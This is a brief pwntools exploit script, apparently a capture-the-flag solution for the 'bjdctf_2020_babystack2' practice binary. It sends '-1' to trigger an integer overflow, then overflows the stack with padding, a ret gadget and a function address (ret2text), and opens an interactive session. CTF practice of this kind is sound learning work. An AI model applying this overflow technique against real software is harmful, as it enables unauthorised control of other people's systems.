#Made by fly_autumn
#x64 ret2text+int overflow
from pwn import *
p = process("./bjdctf_2020_babystack2")
elf = ELF("./bjdctf_2020_babystack2")
context(os="linux",arch="amd64")

p.sendline(b"-1")
offset = 0x18
func_plt = 0x400726
ret_plt = 0x400599
payload = b"\x00" * offset + p64(ret_plt) + p64(func_plt)
p.sendline(payload)

p.interactive()
